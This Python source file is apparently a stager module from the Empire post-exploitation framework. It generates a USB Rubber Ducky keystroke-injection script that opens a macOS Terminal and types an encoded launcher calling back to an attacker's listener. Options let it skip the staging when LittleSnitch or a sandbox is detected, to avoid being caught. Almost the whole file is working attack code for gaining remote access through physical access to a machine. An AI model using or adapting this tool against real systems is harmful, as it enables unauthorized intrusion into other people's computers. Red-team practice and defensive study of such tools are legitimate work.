from empire.server.common import helpers


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "DuckyLauncher",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                }
            ],
            "Description": "Generates a ducky script that runs a one-liner stage0 launcher for Empire.",
            "Comments": [""],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "SafeChecks": {
                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "File to output duckyscript to, otherwise displayed on the screen.",
                "Required": False,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listener_name,
            language=language,
            encode=True,
            userAgent=user_agent,
            safeChecks=safe_checks,
        )

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        ducky_code = "DELAY 1000\n"
        ducky_code += "COMMAND SPACE\n"
        ducky_code += "DELAY 1000\n"
        ducky_code += "STRING TERMINAL\n"
        ducky_code += "ENTER \n"
        ducky_code += "DELAY 1000\n"
        ducky_code += "STRING " + launcher
        ducky_code += "\nENTER\n"
        ducky_code += "DELAY 1000\n"

        return ducky_code
